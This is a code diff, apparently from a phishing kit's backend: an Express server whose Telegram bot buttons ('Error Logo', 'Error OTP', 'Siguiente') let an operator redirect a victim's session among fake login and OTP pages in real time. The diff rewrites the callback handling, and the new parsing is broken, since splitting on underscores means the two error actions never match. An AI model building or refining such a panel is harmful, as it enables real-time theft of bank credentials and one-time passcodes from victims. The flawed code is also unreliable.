@@ -117,26 +117,16 @@ await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
     reply_markup: {
       inline_keyboard: [
         [
-          {
-            text: "❌ Error Logo",
-            callback_data: JSON.stringify({ sessionId, action: 'redirect', redirect_to: 'Virtual-Persona.html' })
-          },
-          {
-            text: "🔁 Error OTP",
-            callback_data: JSON.stringify({ sessionId, action: 'redirect', redirect_to: 'opcion2.html' })
-          }
+          { text: "🔁 Error Logo", callback_data: `error_logo_${sessionId}` },
+          { text: "🔁 Error OTP", callback_data: `error_otp_${sessionId}` }
         ],
         [
-          {
-            text: "✅ Siguiente",
-            callback_data: JSON.stringify({ sessionId, action: 'redirect', redirect_to: 'opcion1.html' })
-          }
+          { text: "✅ Siguiente", callback_data: `siguiente_${sessionId}` }
         ]
       ]
     }
   })
 });
-
 
 
 
@@ -245,43 +235,44 @@ app.get('/set-webhook', async (req, res) => {
 });
 
 app.post('/telegram/webhook', async (req, res) => {
-  try {
-    const update = req.body;
-    res.sendStatus(200); // Siempre responde OK primero
+  const body = req.body;
+  console.log("📩 Webhook recibido:", body); // <-- esto es importante
 
-    const cb = update.callback_query;
-    if (!cb || !cb.data) return;
+  if (body.callback_query) {
+    const callbackData = body.callback_query.data;
+    const [action, sessionId] = callbackData.split('_');
 
-    let data;
-    try {
-      data = JSON.parse(cb.data);
-    } catch (err) {
-      console.error('❌ Error parseando callback_data:', cb.data);
-      return;
+    console.log(`🔧 Acción: ${action} | Sesión: ${sessionId}`);
+
+    // Aquí actualizamos el estado
+    if (sessionId && action) {
+      let redirect_to = null;
+      if (action === 'siguiente') {
+        redirect_to = '/opcion1.html';
+      } else if (action === 'error_logo') {
+        redirect_to = '/Virtual-Persona.html';
+      } else if (action === 'error_otp') {
+        redirect_to = '/otp-check.html';
+      }
+
+      if (redirect_to) {
+        await writeState(sessionId, { pending: { redirect_to } });
+        console.log(`✅ Estado actualizado para ${sessionId} → ${redirect_to}`);
+      }
     }
 
-    const { sessionId, action, redirect_to } = data;
-
-    if (action === 'redirect' && sessionId && redirect_to) {
-      console.log(`➡️ Redirigiendo sessionId ${sessionId} a ${redirect_to}`);
-      await writeState(sessionId, { pending: { redirect_to, at: ts() } });
-
-      // Muy importante: esto notifica a Telegram que el botón fue procesado
-      await fetch(`${TG_API}/answerCallbackQuery`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          callback_query_id: cb.id,
-          text: `🔁 Cliente redirigido a ${redirect_to}`,
-          show_alert: true
-        })
-      });
-    }
-
-  } catch (e) {
-    console.error('❌ Error en webhook:', e);
+    // Responde al botón presionado
+    res.send({
+      method: 'answerCallbackQuery',
+      callback_query_id: body.callback_query.id,
+      text: '✅ Acción recibida.',
+      show_alert: false
+    });
+  } else {
+    res.sendStatus(200);
   }
 });
+
 
 
 app.get('/health', (_, res) => res.send('ok'));
